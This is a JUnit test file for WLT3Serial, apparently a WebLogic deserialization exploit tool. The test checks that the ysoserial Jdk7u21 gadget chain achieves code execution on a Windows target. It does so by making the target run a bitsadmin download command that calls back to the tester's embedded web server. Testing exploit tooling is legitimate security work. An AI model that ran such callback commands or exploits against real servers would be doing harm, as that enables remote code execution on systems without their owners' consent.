/*
	Jdk7u21WindowsTests.java
	
	v0.4 (10/23/2018)
	
	Test to ensure WLT3Serial performs successful exploitation of Windows target system using Jdk7u21 ysoserial payload type.
*/

package bort.millipede.wlt3.tests.exploit;

import java.io.IOException;

import bort.millipede.wlt3.tests.WLT3SerialTestHelper;
import bort.millipede.wlt3.tests.WebServerTestHelper;
import org.junit.Assert;
import org.junit.Before;
import org.junit.After;
import org.junit.Test;

public class Jdk7u21WindowsTests {
	WebServerTestHelper ws;
	
	@Before
	public void setUp() throws IOException {
		try {
			ws = new WebServerTestHelper();
		} catch(IOException ioe) {
			throw new IOException("Embedded web server component failed to start!",ioe);
		} catch(Exception e) {
			throw e;
		}
	}
	
	@After
	public void tearDown() {
		try {
			ws.stop();
		} catch(Exception e) {
			//don't care
		}
	}
		
	@Test
	public void testAssertWindowsJdk7u21() {
		WLT3SerialTestHelper.checkTargetParams();
		String path = ws.createContext();
		WLT3SerialTestHelper.runExploit(null,null,"Jdk7u21","bitsadmin /transfer Jdk7u21Win /download /priority high http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path+" C:\\Windows\\Temp\\Jdk7u21Win.txt");
		String remoteIP = WLT3SerialTestHelper.getAccessedHost(ws,path);
		WLT3SerialTestHelper.checkAccessedHost(remoteIP);
	}
}
